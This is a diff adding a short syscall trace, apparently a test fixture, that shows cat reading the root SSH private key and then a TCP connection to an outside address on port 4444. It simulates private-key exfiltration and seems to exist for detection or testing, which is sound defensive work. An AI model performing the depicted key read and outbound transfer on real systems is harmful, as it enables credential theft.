@@ -1,0 +1,5 @@
+1757200010.000000 execve("/usr/bin/cat", ["/usr/bin/cat", "/dev/fd/3"], /* 5 vars */) = 0 <0.000280>
+1757200010.050000 dup(3</root/.ssh/id_ed25519>) = 5</root/.ssh/id_ed25519> <0.000010>
+1757200010.100000 read(5</root/.ssh/id_ed25519>, "-----BEGIN OPENSSH PRIVATE KEY-----\n"..., 131072) = 411 <0.000091>
+1757200010.200000 connect(9<TCP:[172.17.0.2:40001]>, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("203.0.113.99")}, 16) = 0 <0.031000>
+1757200011.000000 +++ exited with 0 +++
